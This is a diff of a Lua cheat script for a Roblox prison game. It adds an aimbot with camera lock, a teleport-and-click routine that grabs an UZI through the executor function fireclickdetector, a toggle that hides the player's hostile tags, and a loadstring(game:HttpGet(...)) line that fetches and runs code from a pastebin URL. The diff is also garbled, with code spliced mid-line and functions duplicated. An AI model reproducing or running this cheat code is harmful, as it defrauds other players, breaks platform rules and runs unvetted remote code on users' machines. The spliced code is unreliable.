@@ -198,6 +198,147 @@ _G.updateFOV = function(delta)
 end
 
 _G.grabUZI = function()
+	local char = player.Character
+	if not char then return end
+	local hrp = char:FindFirstChild("HumanoidRootPart")
+	if not hrp then return end
+	
+	local originalPos = hrp.CFrame
+	
+	local uziPos = CFrame.new(1842.05945, 156.473984, 2694.41602)
+	
+	hrp.CFrame = uziPos + Vector3.new(0, 3, 0)
+	
+	local itemsFolder = Workspace:FindFirstChild("Prison_ITEMS")
+	if not itemsFolder then hrp.CFrame = originalPos return end
+	local giverFolder = itemsFolder:FindFirstChild("giver")
+	if not giverFolder then hrp.CFrame = originalPos return end
+	
+	local uziModel = nil
+	for _, model in ipairs(giverFolder:GetChildren()) do
+		if model.Name == "UZI" and model:IsA("Model") then
+			if (model:GetPivot().Position - uziPos.Position).Magnitude < 0.5 then
+				uziModel = model
+				break
+			end
+		end
+	end
+	
+	if not uziModel then hrp.CFrame = originalPos return end
+	
+	local clickDetector = uziModel:FindFirstChildOfClass("ClickDetector")
+	if not clickDetector then hrp.CFrame = originalPos return end
+	
+	local startTime = tick()
+	while tick() - startTime < 5 do
+		local backpack = player:FindFirstChild("Backpack")
+		if backpack and backpack:FindFirstChild("UZI") then
+			break
+		end
+		if char:FindFirstChild("UZI") then
+			break
+		end
+		fireclickdetector(clickDetector)
+		task.wait(0.1)
+	end
+	
+	hrp.CFrame = originalPos
+end
+
+local success, result = pcall(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/YZnL7jaV'))()
+end)
+if not success then warn("Error loading UI: "..tostring(result)) end			local adjustedCFrame = lookAtHRP * CFrame.Angles(math.rad(-AIM_ANGLE_OFFSET), 0, 0)
+			camera.CFrame = camera.CFrame:Lerp(adjustedCFrame, SMOOTHNESS)
+			if not MOUSE_LOCKED then
+				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+				MOUSE_LOCKED = true
+			end
+		end
+	else
+		if MOUSE_LOCKED then
+			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+			MOUSE_LOCKED = false
+		end
+	end
+end)
+
+-- Funções compartilhadas
+function enableGraySkybox()
+	local lighting = game:GetService("Lighting")
+	pcall(function() if lighting:FindFirstChild("GraySky") then lighting.GraySky:Destroy() end end)
+	local sky = Instance.new("Sky", lighting)
+	sky.Name = "GraySky"
+	sky.SkyboxBk = "rbxassetid://154987705"
+	sky.SkyboxDn = "rbxassetid://154987705"
+	sky.SkyboxFt = "rbxassetid://154987705"
+	sky.SkyboxLf = "rbxassetid://154987705"
+	sky.SkyboxRt = "rbxassetid://154987705"
+	sky.SkyboxUp = "rbxassetid://154987705"
+end
+
+function disableGraySkybox()
+	local lighting = game:GetService("Lighting")
+	pcall(function() if lighting:FindFirstChild("GraySky") then lighting.GraySky:Destroy() end end)
+	pcall(function() lighting.Sky = nil end)
+end
+
+function updateTagVisibility()
+	local char = player.Character
+	if not char then return end
+	local head = char:FindFirstChild("Head")
+	if not head then return end
+	for _, name in ipairs({"Hostile", "KillstreakHeadGui", "OverheadBBGUI"}) do
+		local billboard = head:FindFirstChild(name)
+		if billboard and billboard:IsA("BillboardGui") then
+			billboard.Enabled = not HIDE_TAG_ENABLED
+		end
+	end
+end
+
+UserInputService.InputBegan:Connect(function(input, processed)
+	if processed then return end
+	if input.KeyCode == Enum.KeyCode.E then
+		AIMBOT_ENABLED = not AIMBOT_ENABLED
+		if _G.updateAimbotState then _G.updateAimbotState() end
+	end
+end)
+
+player.CharacterAdded:Connect(function()
+	camera.CameraType = Enum.CameraType.Custom
+	UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+	MOUSE_LOCKED = false
+	if HIDE_TAG_ENABLED then
+		task.wait(0.5)
+		updateTagVisibility()
+	end
+end)
+
+_G.updateSmooth = function(delta)
+	SMOOTHNESS = math.clamp(SMOOTHNESS + delta, 0.01, 1)
+	if _G.smoothValueLabel then
+		_G.smoothValueLabel.Text = string.format("%.2f", SMOOTHNESS)
+	end
+end
+
+_G.updateAngle = function(delta)
+	AIM_ANGLE_OFFSET = math.clamp(AIM_ANGLE_OFFSET + delta, 0, 15)
+	if _G.angleValueLabel then
+		_G.angleValueLabel.Text = string.format("%.1f°", AIM_ANGLE_OFFSET)
+	end
+end
+
+_G.updateFOV = function(delta)
+	FOV_RADIUS = math.clamp(FOV_RADIUS + delta, 30, 500)
+	if _G.fovValueLabel then
+		_G.fovValueLabel.Text = tostring(FOV_RADIUS)
+	end
+	if fovCircle then
+		fovCircle.Size = UDim2.new(0, FOV_RADIUS*2, 0, FOV_RADIUS*2)
+	end
+end
+
+_G.grabUZI = function()
 	local itemsFolder = Workspace:FindFirstChild("Prison_ITEMS")
 	if not itemsFolder then return end
 	
